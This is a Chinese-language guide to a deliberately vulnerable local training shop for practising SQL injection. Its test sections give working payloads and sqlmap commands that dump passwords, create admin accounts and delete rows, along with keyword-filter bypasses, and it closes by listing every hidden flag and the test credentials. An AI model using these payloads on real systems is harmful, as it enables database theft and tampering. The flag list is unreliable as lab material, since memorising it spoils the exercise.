# VulnShop 使用说明

本文档详细介绍如何使用VulnShop进行SQL注入测试和学习。

## 目录

1. [环境准备](#环境准备)
2. [启动服务](#启动服务)
3. [接口说明](#接口说明)
4. [漏洞测试指南](#漏洞测试指南)
5. [使用sqlmap测试](#使用sqlmap测试)
6. [难度配置](#难度配置)
7. [常见问题](#常见问题)

---

## 环境准备

### 系统要求

- Python 3.7 或更高版本
- 操作系统：Windows / Linux / macOS
- 无需安装额外依赖包

### 检查Python版本

```bash
python --version
# 或
python3 --version
```

确保版本 >= 3.7

---

## 启动服务

### 方式一：直接运行

```bash
cd src/vulnTestServer
python server.py
```

### 方式二：后台运行（Linux/macOS）

```bash
cd src/vulnTestServer
nohup python server.py > vulnshop.log 2>&1 &
```

### 启动成功标志

服务启动后会显示ASCII艺术字和配置信息：

```
╔══════════════════════════════════════════════════════════════════════╗
║           SQL Injection Test Lab - For Educational Use Only          ║
╠══════════════════════════════════════════════════════════════════════╣
║  Version: 1.0.0                                                      ║
║  Difficulty: easy                                                    ║
║  Server: http://127.0.0.1:9527                                       ║
╚══════════════════════════════════════════════════════════════════════╝
```

### 停止服务

按 `Ctrl + C` 停止服务

---

## 接口说明

### 公开接口

| 方法 | 路径 | 说明 | 漏洞类型 |
|------|------|------|----------|
| GET | / | 首页 | - |
| GET | /api/info | 系统信息 | - |
| GET | /api/config | 获取配置 | - |
| POST | /api/config | 设置配置 | - |
| GET | /api/products | 商品列表 | - |
| POST | /api/database/reset | 重置数据库 | - |

### 漏洞接口

| 方法 | 路径 | 参数 | 漏洞类型 |
|------|------|------|----------|
| POST | /api/user/login | username, password | Error-based |
| GET | /api/user/profile | id | Union-based |
| GET | /api/products/search | keyword, category | Boolean-based Blind |
| GET | /api/products/detail | id | Time-based Blind |
| GET | /api/orders/query | order_no 或 user_id | Stacked Queries |
| POST | /api/user/register | username, password, email | Second-order |

---

## 漏洞测试指南

### 1. Error-based SQL注入

**目标接口**: `POST /api/user/login`

**原理**: 通过构造错误的SQL语句，利用数据库返回的错误信息获取数据。

**测试步骤**:

1. 访问登录页面
2. 在用户名输入框中输入payload
3. 观察返回的错误信息

**测试Payload**:

```sql
# 检测注入
admin'

# 提取数据库版本
admin' AND 1=CAST((SELECT sqlite_version()) AS int)--

# 提取表名
admin' AND 1=CAST((SELECT name FROM sqlite_master WHERE type='table' LIMIT 1) AS int)--

# 提取用户密码
admin' AND 1=CAST((SELECT password FROM users WHERE username='admin') AS int)--
```

**使用curl测试**:

```bash
curl -X POST http://127.0.0.1:9527/api/user/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin'\''","password":"x"}'
```

---

### 2. Union-based SQL注入

**目标接口**: `GET /api/user/profile?id=`

**原理**: 利用UNION语句将额外的查询结果附加到原查询结果中。

**测试步骤**:

1. 首先确定列数
2. 使用UNION注入提取其他表的数据

**测试Payload**:

```sql
# 确定列数（回显正常表示列数正确）
1 ORDER BY 6--
1 ORDER BY 7--  # 如果报错，说明只有6列

# 确定回显位置
-1 UNION SELECT 1,2,3,4,5,6--

# 提取secrets表中的flag
-1 UNION SELECT 1,flag,description,4,5,6 FROM secrets--

# 提取所有用户密码
-1 UNION SELECT 1,username,password,email,phone,address FROM users--
```

**使用curl测试**:

```bash
curl "http://127.0.0.1:9527/api/user/profile?id=-1%20UNION%20SELECT%201,flag,description,4,5,6%20FROM%20secrets--"
```

---

### 3. Boolean-based Blind SQL注入

**目标接口**: `GET /api/products/search?keyword=`

**原理**: 通过观察响应差异（有结果/无结果）来逐位猜测数据。

**测试步骤**:

1. 构造条件语句
2. 根据返回结果判断条件是否为真
3. 逐字符猜测目标数据

**测试Payload**:

```sql
# 检测注入（返回有结果 = 条件为真）
test' AND 1=1--
test' AND 1=2--  # 无结果

# 猜测admin密码第一个字符
test' AND (SELECT SUBSTR(password,1,1) FROM users WHERE username='admin')='0'--
test' AND (SELECT SUBSTR(password,1,1) FROM users WHERE username='admin')='1'--
# ... 继续尝试直到有结果

# 使用ASCII码比较
test' AND (SELECT unicode(SUBSTR(password,1,1)) FROM users WHERE username='admin')>96--
```

---

### 4. Time-based Blind SQL注入

**目标接口**: `GET /api/products/detail?id=`

**原理**: 通过响应时间的差异来判断条件是否为真。

**注意**: SQLite没有SLEEP函数，使用randomblob()产生延迟。

**测试Payload**:

```sql
# 检测注入（条件为真时产生延迟）
1 AND (SELECT CASE WHEN (1=1) THEN randomblob(100000000) ELSE 1 END)
1 AND (SELECT CASE WHEN (1=2) THEN randomblob(100000000) ELSE 1 END)  # 无延迟

# 猜测admin密码第一个字符
1 AND (SELECT CASE WHEN (SUBSTR((SELECT password FROM users WHERE username='admin'),1,1)='0') THEN randomblob(100000000) ELSE 1 END)
```

**使用curl测试（观察响应时间）**:

```bash
time curl "http://127.0.0.1:9527/api/products/detail?id=1%20AND%20(SELECT%20CASE%20WHEN%20(1=1)%20THEN%20randomblob(100000000)%20ELSE%201%20END)"
```

---

### 5. Stacked Queries SQL注入

**目标接口**: `GET /api/orders/query?order_no=`

**原理**: 在原查询后面添加新的SQL语句执行。

**测试Payload**:

```sql
# 插入新用户
ORD20231201001'; INSERT INTO users(username,password,email,is_admin) VALUES('hacker','5f4dcc3b5aa765d61d8327deb882cf99','hacker@test.com',1);--

# 更新数据
ORD20231201001'; UPDATE users SET is_admin=1 WHERE username='test';--

# 删除数据（谨慎使用）
ORD20231201001'; DELETE FROM orders WHERE id>10;--
```

---

### 6. Second-order SQL注入

**目标接口**: `POST /api/user/register`

**原理**: 恶意数据先被存储，然后在另一个位置被使用时触发注入。

**测试步骤**:

1. 注册一个包含SQL注入payload的用户名
2. 系统在后续操作中使用该用户名时触发注入

**测试Payload**:

```sql
# 注册用户名为: admin'--
# 当系统查询该用户名时，可能执行: WHERE username = 'admin'--'
# 导致注释掉后面的条件

# 注册时
{"username": "admin'--", "password": "test123", "email": "test@test.com"}
```

---

## 使用sqlmap测试

### 测试登录接口（Error-based）

```bash
sqlmap -u "http://127.0.0.1:9527/api/user/login" \
  --method=POST \
  --data='{"username":"*","password":"test"}' \
  --headers="Content-Type: application/json" \
  --dbms=sqlite \
  --batch
```

### 测试用户资料接口（Union-based）

```bash
sqlmap -u "http://127.0.0.1:9527/api/user/profile?id=1" \
  --dbms=sqlite \
  --batch \
  --dump
```

### 测试商品搜索接口（Boolean-based Blind）

```bash
sqlmap -u "http://127.0.0.1:9527/api/products/search?keyword=test" \
  --dbms=sqlite \
  --technique=B \
  --batch \
  --dump
```

### 测试商品详情接口（Time-based Blind）

```bash
sqlmap -u "http://127.0.0.1:9527/api/products/detail?id=1" \
  --dbms=sqlite \
  --technique=T \
  --batch \
  --dump
```

### 常用sqlmap参数

```bash
--dbms=sqlite       # 指定数据库类型
--batch             # 自动确认
--dump              # 导出数据
--tables            # 列出表名
--columns -T users  # 列出users表的列
-D database -T table -C column --dump  # 导出指定数据
--level=5           # 测试等级
--risk=3            # 风险等级
```

---

## 难度配置

### Easy模式

- 无任何防护
- 所有注入类型可用
- 返回详细错误信息

### Medium模式

- 简单关键字过滤
- 可通过大小写绕过: `UnIoN SeLeCt`
- 可通过编码绕过

**绕过方法**:
```sql
# 大小写混用
-1 UnIoN SeLeCt 1,2,3,4,5,6--

# 双写绕过
-1 UNunionION SEselectLECT 1,2,3,4,5,6--
```

### Hard模式

- 严格关键字过滤
- 长度限制
- 禁止常见绕过技术

**需要的技术**:
- 高级编码绕过
- 内联注释
- 等价函数替换

---

## 常见问题

### Q: 服务无法启动？

A: 检查是否有其他程序占用9527端口，或修改config.py中的PORT配置。

### Q: 提示WAF Blocked？

A: 当前难度设置为medium或hard，请切换到easy模式或使用绕过技术。

### Q: 时间盲注没有延迟？

A: SQLite的randomblob可能效果不明显，尝试增大数值（如500000000）。

### Q: 如何清除测试产生的数据？

A: 访问配置页面点击"重置数据库"，或运行 `python database.py`。

---

## 测试账户速查

| 用户名 | 密码 | 密码MD5 | 角色 |
|--------|------|---------|------|
| admin | admin123 | 0192023a7bbd73250516f069df18b500 | 管理员 |
| test | test | 098f6bcd4621d373cade4e832627b4f6 | 普通用户 |
| alice | alice123 | 6384e2b2184bcbf58eccf10ca7a6563c | 普通用户 |
| bob | bob456 | c45e39b7ae7f3edb1b3c1b7b8b5b8b8b | 普通用户 |

---

## 隐藏Flag

系统中隐藏了多个Flag，尝试通过SQL注入找到它们：

1. `FLAG{sql_injection_master}`
2. `FLAG{error_based_injection_success}`
3. `FLAG{union_based_extraction}`
4. `FLAG{blind_injection_expert}`
5. `FLAG{admin_password_leaked}`

祝你测试愉快！🎯
